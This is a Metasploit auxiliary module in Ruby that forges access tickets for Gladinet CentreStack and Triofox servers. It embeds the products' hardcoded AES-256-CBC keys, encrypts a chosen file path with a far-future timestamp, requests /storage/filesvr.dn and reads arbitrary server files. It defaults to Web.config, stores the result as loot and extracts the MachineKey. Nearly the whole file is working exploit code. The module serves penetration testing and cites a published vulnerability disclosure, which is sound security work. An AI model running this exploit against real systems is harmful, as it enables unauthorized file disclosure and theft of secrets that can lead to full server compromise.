##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'
require 'base64'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Gladinet
  prepend Msf::Exploit::Remote::AutoCheck

  # Hardcoded keys extracted from GladCtrl64.dll
  # SysKey: First 32 UTF-16 characters from DAT_18000c000 converted to UTF-8, then first 32 bytes
  # SysKey1: First 16 UTF-16 characters from DAT_18000c2c0 converted to UTF-8, then first 16 bytes
  # These keys are static and identical across all vulnerable installations
  # Extracted from DAT_18000c000 (SysKey) and DAT_18000c2c0 (SysKey1)
  # The C code does: memcpy with strlen, but the actual keys used are UTF-16 chars -> UTF-8 bytes
  DEFAULT_SYS_KEY = 'E4B88DE8BF87EFBC8CE8B083E69FA5E4B99FE698BEE7A4BAEFBC8CE697A5E69C'.freeze
  DEFAULT_SYS_KEY1 = '6D6F4472697665E381AFE38081E38389'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gladinet CentreStack/Triofox Access Ticket Forge',
        'Description' => %q{
          This module forges access tickets for the Gladinet CentreStack/Triofox
          `/storage/filesvr.dn` endpoint. The vulnerability exists because
          the application uses hardcoded cryptographic keys in GladCtrl64.dll to encrypt/decrypt
          access tickets.

          The access ticket is an encrypted string that contains:
          - Filepath: The absolute path to the file on the server
          - Username: Empty (Application Pool Identity will be used)
          - Password: Empty
          - Timestamp: Creation time (set to excessive year to never expire)

          This module can forge tickets to read arbitrary files from the server's file system.

          Gladinet CentreStack versions up to 16.12.10420.56791 are vulnerable.
          Gladinet Triofox versions up to 16.12.10420.56791 are vulnerable.
        },
        'Author' => [
          'Huntress Team', # Vulnerability discovery and analysis
          'Valentin Lobstein <chocapikk[at]leakix.net>', # Metasploit module
          'Julien Voisin' # Review
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://www.huntress.com/blog/active-exploitation-gladinet-centrestack-triofox-insecure-cryptography-vulnerability']
        ],
        'DisclosureDate' => '2025-12-10',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the Gladinet CentreStack or Triofox application', '/']),
      OptString.new('FILEPATH', [true, 'Absolute path to the file to read on the target', 'C:\\Program Files (x86)\\Gladinet Cloud Enterprise\\root\\Web.config']),
      OptString.new('SYSKEY', [true, 'SysKey (32 bytes) in hex format', DEFAULT_SYS_KEY]),
      OptString.new('SYSKEY1', [true, 'SysKey1 (16 bytes) in hex format', DEFAULT_SYS_KEY1])
    ])
  end

  def get_sys_key
    [datastore['SYSKEY']].pack('H*')
  end

  def get_sys_key1
    [datastore['SYSKEY1']].pack('H*')
  end

  def generate_timestamp
    # Generate random timestamp with excessive year (100+ years in future) to never expire
    # Format: YYYY-MM-DD HH:MM:SS.microseconds
    current_year = Time.now.year
    year_min = current_year + 100
    year_max = current_year + 9999

    ranges = [
      [year_min, year_max],
      [1, 12],
      [1, 28], # Use 28 to avoid month-specific day issues
      [0, 23],
      [0, 59],
      [0, 59],
      [0, 999_999]
    ]
    values = ranges.map do |min, max|
      range_size = max - min + 1
      random_offset = Rex::Text.rand_text_numeric(range_size.to_s.length).to_i % range_size
      min + random_offset
    end
    format('%04d-%02d-%02d %02d:%02d:%02d.%06d', *values)
  end

  def forge_ticket(filepath, timestamp = nil)
    # Build plaintext ticket: Filepath\n\n\nTimestamp (no trailing newline)
    timestamp ||= generate_timestamp
    plaintext = "#{filepath}\n\n\n#{timestamp}"

    sys_key = get_sys_key
    sys_key1 = get_sys_key1

    if sys_key.length != 32
      fail_with(Failure::BadConfig, "SysKey must be exactly 32 bytes, got #{sys_key.length}")
    end
    if sys_key1.length != 16
      fail_with(Failure::BadConfig, "SysKey1 must be exactly 16 bytes, got #{sys_key1.length}")
    end

    # Encrypt with AES-256-CBC, then Base64 encode with URL-safe encoding (+ -> :, / -> |)
    cipher = OpenSSL::Cipher.new('AES-256-CBC')
    cipher.encrypt
    cipher.key = sys_key
    cipher.iv = sys_key1
    encrypted = cipher.update(plaintext) + cipher.final
    Base64.strict_encode64(encrypted).tr('+/', ':|')
  end

  def check
    version = gladinet_version
    return Exploit::CheckCode::Detected('Gladinet detected but version could not be determined') if version.nil?

    rex_version = Rex::Version.new(version)
    return Exploit::CheckCode::Vulnerable("Access ticket forge vulnerability confirmed (Build #{version})") if rex_version <= Rex::Version.new('16.12.10420.56791')

    Exploit::CheckCode::Appears("Version #{version} detected, attempting ticket forge anyway")
  end

  def run
    filepath = datastore['FILEPATH']

    print_status("Forging access ticket for file: #{filepath}")
    ticket = forge_ticket(filepath)

    print_good("Forged access ticket: #{ticket}")

    print_status('Sending request to /storage/filesvr.dn')
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'storage', 'filesvr.dn'),
      'vars_get' => { 't' => ticket }
    })

    unless res&.code == 200
      print_error("Failed to read file. HTTP response code: #{res&.code}")
      return
    end

    print_good("Successfully read file: #{filepath}")
    print_line
    print_line(res.body)
    print_line

    fname = File.basename(filepath)
    path = store_loot(
      'gladinet.file',
      'text/plain',
      datastore['RHOST'],
      res.body,
      fname,
      'File read from Gladinet via forged access ticket'
    )
    print_good("File saved to: #{path}")

    ticket_path = store_loot(
      'gladinet.ticket',
      'text/plain',
      datastore['RHOST'],
      ticket,
      'access_ticket.txt',
      'Forged access ticket for Gladinet'
    )
    print_good("Access ticket saved to: #{ticket_path}")

    handle_machinekey_extraction(res.body, filepath, 'MachineKey extracted from Gladinet Web.config')
  end
end
